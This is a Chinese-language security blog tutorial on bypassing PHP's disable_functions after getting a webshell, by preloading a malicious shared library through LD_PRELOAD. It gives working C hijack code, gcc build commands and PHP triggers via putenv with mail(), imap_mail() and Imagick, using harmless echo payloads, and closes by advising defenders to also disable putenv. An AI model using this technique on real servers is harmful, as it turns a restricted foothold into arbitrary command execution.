---
title: 利用LD_PRELOAD绕过disbale_functions
date: 2019-04-02 10:21:42
tags: [php, bypass, disbale_functions]
categories: Research
---

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

### 0x01 背景

有时候拿到`shell`后发现无法执行系统命令，通过`phpinfo`查看发现设置了`disbale_functions`，禁止了大部分可以执行命令的方法，这时候就要考虑绕过这个限制。本文是介绍了利用`LD_PRELOAD`环境变量加载恶意共享库的方式绕过，当然方式不止文中列出的几种，有何遗漏或不足欢迎提建议。

### 0x02 LD_PRELOAD 环境变量

> *LD_PRELOAD* is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (*libc.so*) This is called preloading a library.

根据文档介绍，如果使用`LD_PRELOAD`环境变量指定了一个共享库或共享对象，那么这个共享对象会在其他对象加载前被加载，例如

```shell
$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls
```

即在执行`ls`命令前，会先加载指定路径的`malloc.so`文件，如果这是一个恶意共享对象，那么可以执行任意操作。

我们可以通过`readelf`命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用`LD_PRELOAD`环境变量指定生成的对象，达到命令执行的目的。

一般情况我们选择简单的或者不带参数的命令，例如`id`，`ls`，`whoami`等，另外为了实现原型一致的劫持函数，也尽量选择常用的或者不用传递参数的函数，例如`getuid()`，`getpid()`，`getgid()`等

以`python`为例，通过命令`readelf -s /usr/bin/python`列出`python`程序调用的系统函数，可以筛选出`get`型的函数

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111421.png)

尝试劫持`getpid()`函数

首先通过man命令查看`getpid()`函数的实现

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111816.png)

然后重写`getpid()`函数

```c
#include <sys/types.h>
#include <unistd.h>

pid_t getpid(void){
    system("echo 'pwned by getpid!'");
    return 0;
}
```

**注意：**因为通过设置`preload`劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时`unsetenv("LD_PRELOAD")`则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，改进版如下：

```c
#include <sys/types.h>
#include <unistd.h>

void payload(void){
    system("echo 'pwned by getpid!'");
}

pid_t getpid(void){
    if (getenv("LD_PRELOAD") == NULL){
        return 0;
    }

    unsetenv("LD_PRELOAD");
    payload();

    return 0;
}
```



接着编译共享对象，`-shared`表示生成共享库，`-fPIC`表示使用地址无关代码

```shell
gcc -shared -fPIC getpid.c -o getpid.so
```

`LD_PRELOAD`设置加载so文件，运行python，可以看到函数被成功劫持

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104653.png)

这个方法有一定限制，首先需要找到一个相对简单的函数原型，然后需要确保该函数被目标程序调用，因此一个更好的方法是利用扩展修饰符修饰函数，优先加载恶意函数，增强通用性，这里就用到了`扩展修饰符` `__attribute__((constructor))`

> GCC 有个 C 语言扩展修饰符 `__attribute__((constructor))`，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 `__attribute__((constructor))` 修饰的函数

简单说就是`__attribute__`可以修饰几个属性，包括函数属性、变量属性和类型属性，语法格式为：

`__attribute__(( attribute-list ))`

当函数属性被设置为`constructor`时，该函数会在可执行文件（或共享对象）加载时被调用，同理当设置属性为`destructor`时会在对象`unload`时调用，也就是说设置为这两个属性时，会在`main()`函数执行之前或者`return()`执行之后被调用，我们就可以借助这个扩展修饰符，当加载so文件时自动执行恶意函数，这样就不局限于某个特定函数，使用面大大扩展了

重新写一个函数，使用 `__attribute__((constructor))`修饰

```c
#include <unistd.h>

void payload(void){
    system("echo 'pwned!'");
}

__attribute__ ((__constructor__)) void exec(void){
    if (getenv("LD_PRELOAD") == NULL){
        return;
    }

    unsetenv("LD_PRELOAD");
    payload();

    return;
}
```

重新编译并加载，成功执行

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402154051.png)



### 0x03 绕过`disable_functions`

接下来看一下怎么利用`LD_PRELOAD`在`php`启用`disable_functions`禁用了命令/代码执行函数的情况下绕过这个限制，达到命令执行的效果

`php.ini`限制大部分执行命令的函数

```ini
disable_functions = assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
```

根据上面的介绍，我们突破`disable_functions`的步骤如下

1. 编写恶意C函数，并编译成共享对象；
2. 在`php`执行过程中找到一个函数，这个函数能够产生一个新的进程；
3. 通过`putenv`设置`LD_PRELOAD`环境变量，使得新产生的进程优先加载恶意共享对象；

第1步在上文已经解决了，第3步也比较容易实现，关键就是第2步，找到一个`php`中可以新起一个进程的函数，目的是为了让这个新进程使用的环境变量加载我们设置的恶意共享对象，达到劫持的目的

在`php`中有这么几个函数可以被利用，`mail()`，`imap_mail()`，以及`Imagick`，来逐一测试

#### mail()

`mail()`函数会启动`sendmail`进程发送邮件，这个过程是可以被劫持的

```php
<?php
    mail("admin@localhost","","","","");
?>
```

通过`strace`查看`mail()`函数调用的过程

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402180420.png)

可以看到除了`php`自身进程外还启动了`sendmail`进程，而`sendmail`在执行过程中调用了多个可以被劫持的函数，例如`getuid`，`getgid`， `getpid`等，我们还是以上面的`getpid`为例测试

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403103643.png)

通过`putenv`将`LD_PRELOAD`环境变量设置为上面编译好的`getpid.so`

```php
<?php
    putenv("LD_PRELOAD=/tmp/getpid.so");
    mail("admin@localhost","","","","");
?>
```

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104908.png)

成功绕过`disable_functions`限制。另外也可以用`__attribute__ ((__constructor__))`修饰函数，这样就不局限于某个系统函数。

#### imap_mail()

`imap_mail()`函数与`mail()`函数类似，都会调用`sendmail`程序发送邮件，因此也能通过`LD_PRELOAD`环境变量绕过，方法同上

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403141357.png)

#### Imagick

`Imagick`作为使用广泛的图形处理库，它在处理各种类型的文件时会调用不同的处理程序，这个过程也是可以进行劫持的，常见的文件类型与处理程序对应关系列举如下

| 文件类型       | 调用程序                                      |
| -------------- | --------------------------------------------- |
| EPI/EPS/PDF/PS | [Ghostscript](http://www.cs.wisc.edu/~ghost)  |
| MNG/M2V        | [ffmpeg](http://www.ffmpeg.org/download.html) |
| JXR            | [jxrlib](https://jxrlib.codeplex.com/)        |

详细的依赖调用关系可以参考[官方网站](https://imagemagick.org/script/formats.php)

以`eps`文件为例，使用`Imagick`加载

```php
<?php
    $a = new Imagick("/tmp/payload.eps");
?>
```

如果出现报错

`Uncaught ImagickException: not authorized 'payload.eps'`

需要修改`imagick`的`policy.xml`文件，把相应文件类型的权限修改为`read|write`

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403151458.png)



通过`strace`可以看到启动了`gs`程序处理

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403152424.png)

因此我们同样可以通过修改`LD_PRELOAD`达到执行代码的目的，而实际上这个过程并不要求`payload.eps`是个合法的`eps`文件

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403153255.png)

类似的，`pdf`、`ps`、`wmv`文件等，都可以通过这个方法利用。



### 0x04 总结

本文主要介绍了如何利用`LD_PRELOAD`突破`disbale_functions`，当然这个方法也有一个限制，那就是`putenv`没有被禁用，得以设置环境变量，因此在不影响系统运行的前提下也需要把`putenv`加上。



参考：

https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ



<script>pangu.spacingPage();</script>

